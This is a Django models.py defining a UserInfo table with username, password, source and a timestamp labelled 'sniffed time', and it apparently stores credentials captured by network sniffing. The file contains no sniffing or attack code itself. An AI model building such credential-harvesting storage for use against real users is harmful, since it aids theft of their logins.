from __future__ import unicode_literals

from django.db import models

# Create your models here.

class UserInfo(models.Model):
	def __unicode__(self):
		return self.userName+'|'+self.password+'@'+self.source
	userName = models.CharField(max_length=30)
	password = models.CharField(max_length=30)
	source = models.CharField(max_length=30)
	time = models.DateTimeField('sniffed time')
